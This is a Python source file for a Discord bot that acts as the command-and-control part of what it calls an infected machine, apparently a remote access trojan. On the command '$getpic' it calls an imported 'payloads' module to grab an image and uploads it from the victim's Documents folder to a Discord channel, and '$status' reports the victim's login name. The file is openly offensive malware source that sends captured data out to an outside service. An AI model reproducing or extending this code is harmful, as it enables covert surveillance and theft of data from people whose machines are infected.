import discord
import asyncio
from payloads.satelite import collectimage
import os

bot_token = ""

def init_bot(token):
    global bot_token
    bot_token = token


Client = discord.Client()
@Client.event
async def on_ready():
    await Client.change_presence(game=discord.Game(name=os.getlogin()))
    
    
@Client.event
async def on_message(message):
    if message.content.startswith('$getpic'):
        path = os.path.expandvars("%userprofile%") +'\\Documents\\'
        print(path)

        if collectimage():
            await Client.send_file(message.channel,path+'tempic.png')
        else:
            await Client.send_message(message.channel,"[Error] : Couldn't grab pic :( ")
    elif message.content.startswith('$status'):
        await Client.send_message(message.channel,"Hello i'm epsilon bot by Sreyas i'm currently speaking from infected machine " + os.getlogin())
       
def runbot():
    Client.run(bot_token)


